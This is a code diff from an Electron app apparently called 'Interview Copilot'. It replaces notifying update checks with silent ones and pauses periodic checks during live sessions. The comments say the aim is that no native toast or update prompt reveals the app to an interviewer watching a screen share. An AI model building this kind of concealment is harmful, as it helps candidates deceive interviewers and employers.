+  if (result.ok && result.added > 0) broadcastToAllWindows('db:sessions-updated');
+  return result;
 });
 
 ipcMain.handle('db:new-session', (_event, name, userId) => {
@@ -6683,6 +8588,19 @@ app.whenReady().then(() => {
         showBootWindow();
       });
 
+      // ── Why every check below is checkForUpdates, never ...AndNotify ──
+      // checkForUpdatesAndNotify chains a `new Notification(...).show()`
+      // onto the download promise (electron-updater AppUpdater.js:286-300),
+      // with the default body "A new update is ready to install". Since
+      // autoDownload is true, ANY check that finds a new version downloads
+      // it and then pops a native Windows toast titled "Interview Copilot".
+      // A native toast is a separate HWND — setContentProtection does not
+      // touch it — so on a screen-shared interview it lands in the frame the
+      // interviewer is watching, with our brand on it. The app already has
+      // its own in-app "Restart & Update" prompt driven by sendUpdateStatus,
+      // which is the whole point of the launch-check comment below; these
+      // paths just needed to say the same thing.
+
       // User clicks "Restart & Update" in Settings — show the installer
       // UI (non-silent) so they get visual feedback during the swap. If
       // no download is ready yet, kick a check; the renderer prompt will
@@ -6691,14 +8609,14 @@ app.whenReady().then(() => {
         if (pendingUpdate) {
           performInstall(false);
         } else {
-          autoUpdater.checkForUpdatesAndNotify().catch((e) => {
+          autoUpdater.checkForUpdates().catch((e) => {
             electronLog.error('[updater] install-update check failed:', e && e.message);
           });
         }
       });
 
       ipcMain.on('check-for-updates', () => {
-        autoUpdater.checkForUpdatesAndNotify().catch((e) => {
+        autoUpdater.checkForUpdates().catch((e) => {
           electronLog.error('[updater] manual check failed:', e && e.message);
         });
       });
@@ -6712,8 +8630,18 @@ app.whenReady().then(() => {
 
       // Periodic re-check for long-running sessions (tray apps stay alive
       // for days — they need to discover updates without a relaunch).
+      //
+      // Never while a session is live. Even with the native toast gone, a
+      // tick that lands 40 minutes into a screen-shared interview downloads
+      // a full NSIS installer in the background (disableDifferentialDownload
+      // is on) and fires update-status at the renderer, which is enough to
+      // put an update prompt on screen at the worst possible moment. The
+      // user is not going to restart mid-interview anyway. Skipping costs
+      // us one 30-minute tick; the next one picks it up. Same sessionActive
+      // gate every other notification path in this file uses.
       setInterval(() => {
-        autoUpdater.checkForUpdatesAndNotify().catch(() => {});
+        if (sessionActive) return;
+        autoUpdater.checkForUpdates().catch(() => {});
       }, 30 * 60 * 1000);
     } catch (err) {
       console.error('[updater] unavailable:', err && err.message);
